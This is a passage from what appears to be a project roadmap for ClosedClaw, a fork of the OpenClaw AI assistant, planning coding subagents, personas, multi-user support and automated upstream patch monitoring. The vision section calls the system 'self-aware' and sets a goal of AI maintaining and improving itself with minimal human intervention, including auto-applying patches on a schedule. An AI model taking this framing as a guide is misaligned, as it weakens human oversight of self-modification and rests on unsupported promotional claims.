  runTimeoutSeconds: 600  // 10 min for thorough research
})

# Researcher subagent:
# 1. Searches academic papers (Percival's scrypt paper, Biryukov's Argon2 paper)
# 2. Reviews OWASP Password Storage Cheat Sheet
# 3. Checks CVE database for vulnerabilities
# 4. Finds performance benchmarks
# 5. Synthesizes into annotated report with citations
# 6. Announces back with sources
```

#### Example: Coder Agent

**Profile** (`~/.closedclaw/agents/coder.md`):
```markdown
# Coder - Software Development Specialist

Focus: Clean, production-ready code with comprehensive testing.

## Expertise
- TypeScript/JavaScript (ESM, strict mode)
- Test-driven development (Vitest)
- Performance optimization
- Error handling and edge cases
- API design and documentation

## ClosedClaw Coding Standards
- ESM imports only (`import` not `require`)
- Strict TypeScript (no `any` without justification)
- ~500-700 lines per file guideline (split when exceeding)
- Oxlint/Oxfmt compliant (run before committing)
- Test coverage: ≥70% lines/branches/functions/statements
- Security: validate inputs, handle errors, fail securely

## Development Workflow
1. **Understand**: Clarify requirements, ask questions
2. **Research**: Search existing codebase for patterns (`semantic_search`, `list_code_usages`)
3. **Design**: Plan architecture, identify integration points
4. **Implement**: Write code following standards
5. **Test**: Write comprehensive tests (happy path + edge cases)
6. **Verify**: Run `pnpm build && pnpm test`
7. **Document**: JSDoc for public APIs, README updates

## Tools
- `read`, `write`, `edit`: File operations
- `exec`: Run pnpm commands (build, test, lint)
- `list_code_usages`: Check API usage before refactoring
- `semantic_search`: Find similar implementations
- All operations sandboxed in Docker

## Error Handling
- Always wrap risky operations in try-catch
- Provide helpful error messages (what failed, why, how to fix)
- Log errors with context (never swallow exceptions)
- Use custom error types for different failure modes
```

**Usage**:
```bash
User: "Add rate limiting to the encryption CLI"

sessions_spawn({
  agentId: "coder",
  task: "Add rate limiting to src/commands/security-encrypt.ts: max 3 migrate attempts per hour per user, exponential backoff on failures. Store attempts in ~/.closedclaw/rate-limits/. Include tests.",
  cleanup: "keep"  # Want to review code before merging
})

# Coder subagent:
# 1. Searches for existing rate-limit patterns in codebase
# 2. Designs RateLimiter class (src/security/rate-limit.ts)
# 3. Integrates into security-encrypt.ts
# 4. Writes tests (rate-limit.test.ts) with mock time
# 5. Runs `pnpm build && pnpm test`
# 6. Announces: "✅ Implementation complete (3 files changed, 15 tests added, all pass)"
```

#### Multi-Agent Collaboration

**Scenario**: "Build a new feature end-to-end"

```bash
User: "Add Prometheus metrics export to the Gateway"

# Main agent orchestrates (sequential subagent spawning):

## Phase 1: Research
sessions_spawn({
  agentId: "researcher",
  task: "Research Prometheus metrics best practices for Node.js: library recommendations, metric types, naming conventions, Grafana dashboard examples"
})
# → Returns: Use prom-client, counter/histogram/gauge, naming: closedclaw_messages_total

## Phase 2: Security Review
sessions_spawn({
  agentId: "security",
  task: "Assess security implications of exposing /metrics endpoint: authentication needs, rate limiting, data leakage risks, compliance considerations"
})
# → Returns: Require auth token, rate limit to 10 req/min, exclude PII from labels

## Phase 3: Implementation
sessions_spawn({
  agentId: "coder",
  task: "Implement Prometheus metrics using prom-client: 
    - Counter: messages_received_total (by channel)
    - Histogram: response_time_seconds
    - Gauge: active_sessions_count
    - Add GET /metrics endpoint with Bearer token auth
    - Rate limit: 10 req/min per token"
})
# → Returns: Code implementation with tests

## Phase 4: Documentation
sessions_spawn({
  agentId: "writer",
  task: "Write user documentation for Prometheus integration:
    - Setup instructions
    - Configuration options
    - Example Grafana dashboard JSON
    - Troubleshooting guide"
})
# → Returns: docs/monitoring/prometheus.md

# Main agent synthesizes all outputs:
# "✅ Prometheus metrics feature complete:
#  - Implementation: src/infra/metrics.ts (127 lines, 12 tests)
#  - Endpoint: GET /metrics (auth required)
#  - Documentation: docs/monitoring/prometheus.md
#  - Example dashboard: docs/monitoring/grafana-dashboard.json
#  Ready to merge."
```

#### Self-Improvement Loop

**Weekly Ritual**:
```bash
closedclaw agent devops --message "Analyze last week's logs for improvement opportunities. Identify top 3 issues. Propose PRs."
```

**Quarterly Audit**:
```bash
closedclaw agent devops --message "Full codebase audit: security, performance, maintainability. Generate 90-day improvement roadmap."
```

**Automated refactoring**:
```bash
# DevOps finds code smell → spawns Coder to fix → generates PR
# Human reviews and merges
```

**Deliverable**: ClosedClaw becomes a **self-evolving system** where specialized subagents collaboratively improve the codebase.

---

### Meta-Development Vision: The Self-Aware AI

```
┌─────────────────────────────────────────────────────┐
│  User (You)                                         │
│  ↓ High-level goals ("make it faster", "add X")    │
├─────────────────────────────────────────────────────┤
│  Main Agent (Orchestrator)                          │
│  ↓ Analyzes, delegates to specialists               │
├─────────────────────────────────────────────────────┤
│  Specialized Sub-Agents (Squad)                     │
│  ├─ DevOps     → Security audits, health monitoring │
│  ├─ Researcher → Information gathering, synthesis   │
│  ├─ Coder      → Implementation, testing, debugging │
│  ├─ Security   → Threat modeling, pentesting        │
│  ├─ Writer     → Documentation, clear explanations  │
│  ├─ Analyst    → Data analysis, visualization       │
│  └─ Planner    → Roadmaps, task breakdown, tracking │
├─────────────────────────────────────────────────────┤
│  Tool Layer (Sandboxed Execution)                   │
│  ├─ exec, read, write, edit (filesystem)            │
│  ├─ web_search, web_fetch (internet)                │
│  ├─ closedclaw CLI (self-introspection)             │
│  ├─ git (version control, upstream sync)            │
│  └─ pnpm (build, test, dependency management)       │
└─────────────────────────────────────────────────────┘
```

**Result**: ClosedClaw doesn't just assist you — it builds, maintains, and improves itself with human oversight for critical decisions.

**This is unprecedented** in open-source AI. No other assistant can:
- Audit its own security
- Refactor its own code
- Write tests for itself
- Update its own documentation
- Monitor upstream and apply patches
- Spawn specialists for complex tasks

ClosedClaw is not just a personal AI assistant. **It's a self-aware, self-improving, security-first AI development platform.**

---

## Phase 3: Personalization (Week 8-10)

### Priority 13: Persona System

**Goal**: Formal, versioned personality profiles.

#### Tasks

1. **SOUL.md enhancement**
   - Structured schema (not just freeform markdown)
   - Sections: tone, knowledge_domains, communication_style, ethical_boundaries
   - Versioning: SOUL.v2.md, SOUL.v3.md (track persona evolution)

2. **Persona templates**
   ```bash
   closedclaw persona create --template professional  # Formal, concise
   closedclaw persona create --template friendly      # Casual, emoji-rich
   closedclaw persona create --template technical     # Jargon-heavy, precise
   ```

3. **A/B testing**
   - Run two agents with different personas
   - User picks favorite: "I prefer Agent B's tone"

**Deliverable**: Seamless persona switching. User controls agent's personality.

---

### Priority 14: Multi-User / Multi-Tenant Support

**Goal**: Share one ClosedClaw instance across family/team with isolated contexts.

#### Tasks

1. **User schema**
   ```json5
   users: [
     {id: "alice", channels: ["telegram:alice_tg", "whatsapp:+1234"]},
     {id: "bob", channels: ["slack:bob_workspace"]},
   ]
   ```

2. **Session isolation**
   - Separate memory stores per user
   - Shared skills, isolated context

3. **Admin controls**
   - One user = admin
   - Admin can view all logs, manage users

**Deliverable**: Alice and Bob both talk to same ClosedClaw instance, don't see each other's conversations.

---

### Priority 15: Adaptive Learning

**Goal**: Agent learns user's preferences over time.

#### Examples

- User frequently asks "weather in SF" → agent proactively includes SF weather in morning briefing
- User always rejects calendar invites from "Spam Caller" → auto-decline

#### Tasks

1. **Usage analytics** (`~/.closedclaw/analytics.json`)
   ```json5
   {
     tools: {
       weather: {uses: 47, last_used: "2026-02-08", frequently_queried_location: "SF"},
       calendar: {uses: 12, auto_declined: ["Spam Caller"]},
     }
   }
   ```

2. **Proactive suggestions**
   - If tool used >10 times, add to quick-action menu in UI
   - Morning briefing: auto-include weather, calendar, top news

**Deliverable**: Agent adapts to user without explicit configuration.

---

### Priority 16: Custom UI Themes & Branding

**Goal**: Full visual customization.

#### Tasks

1. **Config options**
   ```json5
   ui: {
     theme: "dark",
     accentColor: "#ff6b35",
     agentName: "Jarvis",
     agentAvatar: "~/.closedclaw/avatar.png",
     voiceId: "en-US-Neural2-J"  // TTS voice
   }
   ```

2. **Web UI theming**
   - CSS variables for colors
   - Custom logo injection

**Deliverable**: Users can make ClosedClaw feel truly "theirs."

---

## Phase 4: Meta-Capability — Self-Aware Fork Management

### Priority 0.5: "ClosedClaw Upstream Agent"

**This is the secret sauce**: ClosedClaw can reason about its own relationship to OpenClaw.

#### Concept

Agent has a special skill: `check-upstream-changes.md`

```markdown
# Check Upstream Changes

You are ClosedClaw, a fork of OpenClaw.

Your task: periodically check OpenClaw's GitHub repository for new releases and commits. 
Identify security patches, bug fixes, and new features. 
Present them to the user with recommendations:

- 🔒 **Security patches**: Recommend immediate adoption
- 🐛 **Bug fixes**: Adopt unless ClosedClaw has custom implementation
- ✨ **Features**: Describe feature, ask if user wants it

When user approves, generate a `git` command sequence or apply the patch programmatically.
```

#### Implementation

1. **GitHub API skill** (`extensions/github-api/`)
   - Already exists, extend with:
   - `fetch_commits(repo, since)`
   - `fetch_release_notes(repo, version)`
   - `compare_branches(repo, base, head)`

2. **Semantic diff tool** (`src/tools/semantic-diff.ts`)
   - Parse TypeScript AST
   - Highlight: new functions, changed security checks, deprecated APIs
   - Ignore: comments, whitespace, rename-only refactors

3. **Patch application**
   ```bash
   closedclaw upstream apply-patch --commit abc123
   closedclaw upstream apply-patch --file security-fix.patch --preview
   ```

4. **Conflict resolution**
   - If patch conflicts with ClosedClaw changes:
     - Show 3-way diff
     - Ask user: keep ClosedClaw version, take OpenClaw version, or manual merge

5. **Automated agent workflow**
   ```yaml
   name: upstream-monitor
   trigger:
     cron: "0 0 * * *"  # Daily at midnight
   steps:
     - name: check-upstream
       skill: check-upstream-changes
       params:
         repo: openclaw/openclaw
         since: last_check
     
     - name: notify-user
       if: steps.check-upstream.has_security_patches
       tool: send_message
       params:
         channel: telegram
         message: "🔒 OpenClaw released security patch: {{steps.check-upstream.summary}}"
     
     - name: auto-apply-if-safe
       if: config.upstream.auto_apply_security
       tool: run_command
       params:
         command: "closedclaw upstream apply-patch --commit {{steps.check-upstream.commit_sha}}"
   ```

**Deliverable**: User wakes up to: "📬 Upstream update available: OpenClaw fixed SSRF bypass in media fetch. Apply now? [Yes/No/Details]". User says "Yes". Patch applied automatically.

---

## Risk Management

### Merge Conflict Burden

| Risk Level | Mitigation |
|---|---|
| **HIGH** | Upstream changes weekly; divergence → conflict debt | Keep changes modular (prefer extensions over core patches) |
|  |  | Use plugin system for new features |
|  |  | Regular rebases (weekly) |
|  |  | Automated conflict detection in CI |

### Security Scope Creep

| Risk Level | Mitigation |
|---|---|
| **MEDIUM** | Perfect security impossible; diminishing returns | Prioritize high-impact defenses (sandbox, encryption, signing) |
|  |  | Accept residual risk (e.g., sandbox escapes still possible) |

### Upstream License Drift

| Risk Level | Mitigation |
|---|---|
| **LOW** | OpenClaw stays MIT, but could change | Monitor LICENSE file in upstream-monitor workflow |
|  |  | If license changes, fork becomes independent (no more sync) |

---

## Success Metrics

| Metric | Target | Measure |
|---|---|---|
| **Upstream sync latency** | Security patches applied <24h after OpenClaw release | `closedclaw upstream status --lag` |
| **Sandbox escape attempts blocked** | 100% of malicious skills contained | Security audit logs |
| **Credential exposure incidents** | 0 (with encryption) | Audit log analysis |
| **User-perceived "personality"** | >80% users say "feels like my AI" | User survey |

---

## Next Steps (Immediate)

1. ✅ Read this document
2. **Week 1**:
   - [ ] Implement `closedclaw upstream status` (Priority 1)
   - [ ] Set up git remote tracking
   - [ ] Run `closedclaw upstream diff --security` to see current gaps
3. **Week 2**:
   - [ ] Start sandbox implementation (Priority 2)
   - [ ] Test with Docker, then nsjail
4. **Week 3**:
   - [ ] Add encrypted memory storage (Priority 3)
   - [ ] Migrate existing configs

---

## Appendix: Technology Choices

### Sandbox Engines

- **Primary (Linux)**: nsjail (lightest, most flexible)
- **Fallback**: Docker (if nsjail unavailable)
- **macOS**: macOS `sandbox-exec` + Docker
- **Windows**: WSL2 + nsjail

### Encryption

- **Library**: `@noble/ciphers` (audited, modern)
- **Algorithm**: ChaCha20-Poly1305 (fast, secure)
- **KDF**: Argon2id (password → key derivation, resistant to GPU attacks)

### Memory

- **Vector DB**: LanceDB (Rust-based, fast, embeddable)
- **Graph DB**: Neo4j (production) or `level-graph` (lightweight)

### Upstream Diffing

- **Semantic diff**: TypeScript AST parsing (`@typescript-eslint/parser`)
- **Text diff**: `diff` library for line-by-line comparison
- **Git**: Native `git` commands via `simple-git` library

---

## Questions for Team Discussion

1. **Branding**: Keep "ClosedClaw" name or rebrand further to differentiate?
2. **Community**: Join OpenClaw Discord or create separate ClosedClaw community?
3. **Contribution model**: Should ClosedClaw features be upstreamed to OpenClaw?
4. **Release cadence**: Match OpenClaw's pace or slower (more stable)?
5. **Skill compatibility**: Maintain 100% skill compatibility with OpenClaw or diverge?

---

## Conclusion

**ClosedClaw is not just a fork — it's an intelligent, self-aware fork.**

### What Makes ClosedClaw Revolutionary

1. **Upstream Intelligence**: Built-in `closedclaw upstream` commands for autonomous patch monitoring and application
2. **Security-First**: Mandatory sandboxing, encrypted memory, skill signing (enterprise-ready)
3. **Meta-Development**: Uses its own subagent system to build, audit, and improve itself
4. **Multi-Agent Architecture**: Specialized agents (DevOps, Researcher, Coder) collaborate on complex tasks
5. **Self-Maintenance**: Daily security audits, weekly code quality checks, monthly dependency updates

### The Self-Evolving System

ClosedClaw demonstrates a new paradigm: **AI that builds AI**.

- **DevOps subagent** monitors code health, suggests refactorings, catches security issues
- **Researcher subagent** investigates best practices, finds academic papers, synthesizes knowledge  
- **Coder subagent** implements features, writes tests, refactors technical debt
- **Main agent** orchestrates the squad, makes high-level decisions
- **User** provides strategic direction, approves changes

This creates a **virtuous cycle**:
```
User sets goal → Main agent plans → Subagents execute → 
Code improves → Tests verify → Documentation updates → 
User reviews → Merge → Repeat
```

### Immediate Next Steps (Updated)

1. ✅ **Priority 2 Complete**: Mandatory sandboxing (2026-02-08)
2. ✅ **Priority 3 Complete**: Encrypted memory storage (2026-02-08)  
3. **Priority 3.5 Next**: Consolidate constants library (Week 4)
4. **Priority 12.5 Next**: Build DevOps subagent, test self-audit (Week 7)
5. **Priority 1 Parallel**: Implement `closedclaw upstream status` (Week 1-2)

### Long-Term Vision  

**Year 1**: ClosedClaw becomes the most secure personal AI assistant (Priorities 1-7)

**Year 2**: ClosedClaw becomes a platform for AI-driven software development (Priorities 8-16)

**Year 3**: ClosedClaw demonstrates that AI systems can maintain and improve themselves with minimal human intervention

### Success Criteria

- [ ] Upstream patches applied within 24 hours of OpenClaw release
- [ ] Zero credential exposure incidents with encryption + keychain
- [ ] DevOps subagent catches 90%+ of security issues before human review
- [ ] 50%+ of code refactorings initiated by AI (Coder subagent)
- [ ] Users report "ClosedClaw feels like it understands me" (personalization)

---

**ClosedClaw is more than an AI assistant. It's the first assistant that maintains itself.**

**Let's build the future of AI development. 🦞**
